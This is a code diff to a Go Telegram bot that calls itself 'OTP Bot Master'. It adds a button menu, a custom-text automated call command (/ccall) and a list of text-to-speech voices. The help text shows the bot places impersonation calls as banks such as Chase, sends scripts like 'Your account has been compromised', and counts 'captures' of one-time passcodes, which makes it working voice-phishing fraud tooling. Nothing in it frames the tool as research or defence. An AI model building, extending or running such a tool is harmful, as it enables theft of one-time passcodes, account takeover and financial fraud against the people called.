@@ -116,6 +116,13 @@ func (b *Bot) processUpdates() {
 }
 
 func (b *Bot) handleUpdate(update tgbotapi.Update) {
+	// Handle callback queries (button presses)
+	if update.CallbackQuery != nil {
+		b.HandleCallback(update.CallbackQuery)
+		return
+	}
+	
+	// Handle regular messages
 	if update.Message != nil {
 		b.handleMessage(update.Message)
 	}
@@ -148,10 +155,14 @@ func (b *Bot) IsAdmin(userID int64) bool {
 }
 
 func (b *Bot) handleMessage(msg *tgbotapi.Message) {
-	if !msg.IsCommand() {
-		return
+	// Check if it's a callback query first
+	if msg.IsCommand() {
+		b.handleCommand(msg)
 	}
+}
 
+// handleCommand processes all command messages
+func (b *Bot) handleCommand(msg *tgbotapi.Message) {
 	if !b.IsAdmin(msg.From.ID) {
 		b.sendMessage(msg.Chat.ID, "⛔ Access denied. You are not authorized to use this bot.")
 		return
@@ -162,6 +173,8 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 	switch command {
 	case "start":
 		b.sendStartMessage(msg)
+	case "menu":
+		b.showMainMenu(msg.Chat.ID)
 	case "help":
 		b.sendHelpMessage(msg)
 	case "stats":
@@ -191,6 +204,9 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 		b.sendCampaignDetails(msg, id)
 	case "call":
 		b.handleCallCommand(msg)
+	case "ccall":
+		// Custom call with quoted text - /ccall <phone> "message text"
+		b.handleCustomCallCommand(msg)
 	case "batch":
 		b.handleBatchCommand(msg)
 	case "stop":
@@ -244,6 +260,8 @@ func (b *Bot) handleMessage(msg *tgbotapi.Message) {
 	case "deltemplate":
 		name := strings.ToLower(strings.TrimSpace(msg.CommandArguments()))
 		b.deleteTemplate(msg, name)
+	case "voices":
+		b.showVoicesList(msg)
 	}
 }
 
@@ -266,7 +284,7 @@ func (b *Bot) sendStartMessage(msg *tgbotapi.Message) {
 		stats = &models.GlobalStats{}
 	}
 
-	text := fmt.Sprintf(`🤖 *OTP Bot Master* is online!
+	text := fmt.Sprintf(`🤖 *OTP Bot Master* v2.0 is online!
 
 📊 *Global Stats:*
 ├ Total Campaigns: %d
@@ -275,15 +293,23 @@ func (b *Bot) sendStartMessage(msg *tgbotapi.Message) {
 ├ Total Captures: %d
 └ Success Rate: %.1f%%
 
+✨ *New Features:*
+• /menu - Beautiful button interface
+• /ccall - Custom text in quotes ""
+• /voices - All available TTS voices
+
 📞 Available Commands:
+• /menu - Button-based interface (NEW!)
 • /call - Make a single call
+• /ccall - Custom text call (NEW!)
 • /batch - Start a batch campaign
 • /campaigns - List all campaigns
 • /templates - List service templates
 • /stats - Detailed statistics
+• /voices - Available voices (NEW!)
 • /help - Full command list
 
-Use /help for detailed instructions.`,
+Use /menu for the beautiful button interface! 💕`,
 		stats.TotalCampaigns, stats.ActiveCampaigns,
 		stats.TotalCalls, stats.TotalCaptures, stats.SuccessRate,
 	)
@@ -292,11 +318,18 @@ Use /help for detailed instructions.`,
 }
 
 func (b *Bot) sendHelpMessage(msg *tgbotapi.Message) {
-	text := `📖 *Command Reference*
+	text := `📖 *Command Reference* v2.0
+
+*✨ New Commands*
+/menu - Beautiful button interface 💕
+/ccall <phone> "message" [voice] - Custom text call
+/voices - List all available TTS voices
 
 *📞 Calling Commands*
 /call <phone> <service> - Make single call
   Example: /call +15551234567 chase
+/ccall <phone> "message" - Custom text call
+  Example: /ccall +15551234567 "Your account has been compromised" en-GB-WOMAN
 /sms <phone> <message> - Send SMS fallback
   Example: /sms +15551234567 Your OTP is 1234
 
@@ -316,6 +349,14 @@ func (b *Bot) sendHelpMessage(msg *tgbotapi.Message) {
 /edittemplate - Edit template
 /deltemplate <name> - Delete template
 
+*🎙️ Voice Options*
+WOMAN, MAN - English (US)
+en-GB-WOMAN, en-GB-MAN - English (UK)
+es-ES-WOMAN - Spanish
+fr-FR-WOMAN - French
+de-DE-WOMAN - German
+it-IT-WOMAN - Italian
+
 *📊 Monitoring Commands*
 /stats - Global statistics
 /logs <n> - Recent logs (default 20)
@@ -323,6 +364,7 @@ func (b *Bot) sendHelpMessage(msg *tgbotapi.Message) {
 /backup - Download database backup
 
 *⚙️ Configuration*
+/menu - Open button interface
 /config - Show current config
 /reload - Hot-reload config
 /cleanup <days> - Clean old data
